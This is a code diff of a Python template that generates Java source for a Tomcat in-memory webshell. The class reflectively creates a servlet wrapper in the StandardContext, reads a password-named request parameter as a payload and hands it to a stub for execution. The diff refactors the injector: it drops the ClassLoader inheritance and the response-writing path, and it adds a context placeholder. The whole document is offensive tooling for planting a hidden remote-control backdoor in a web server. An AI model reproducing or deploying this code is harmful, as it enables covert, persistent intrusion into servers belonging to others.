@@ -1,11 +1,12 @@
 code = """
 import java.lang.reflect.*;
-import java.util.ArrayList;
+import java.util.*;
 
-public class TomcatServlet extends ClassLoader implements InvocationHandler {{
+public class TomcatServlet implements InvocationHandler {{
     private static String pattern = "*.xml";
     private static String password = "{password}";
 {common}
+{context}
 {decoder}
 {stub}
     private void hook(Object servletRequest, Object servletResponse)
@@ -13,10 +14,7 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
         String payload = (String) invokeMethod(
             servletRequest, "getParameter", password
         );
-        invokeMethod(
-            invokeMethod(servletResponse, "getWriter"),
-            "write", stub(payload, servletRequest, servletResponse)
-        );
+        stub(payload, servletRequest, servletResponse);
     }}
 
     @Override
@@ -30,8 +28,7 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
         return null;
     }}
 
-    private void addSevlet(Object proxyObject)
-            throws IllegalAccessException, InvocationTargetException {{
+    private void addSevlet(Object proxyObject) throws Exception {{
         Object context = getStandardContext();
         Object wrapper = invokeMethod(context, "createWrapper");
         String name = this.getClass().getName();
@@ -70,10 +67,6 @@ public class TomcatServlet extends ClassLoader implements InvocationHandler {{
                 }} catch (Exception e) {{}}
             }}
         }}
-    }}
-
-    public TomcatServlet(ClassLoader loader) {{
-        super(loader);
     }}
 
     static {{
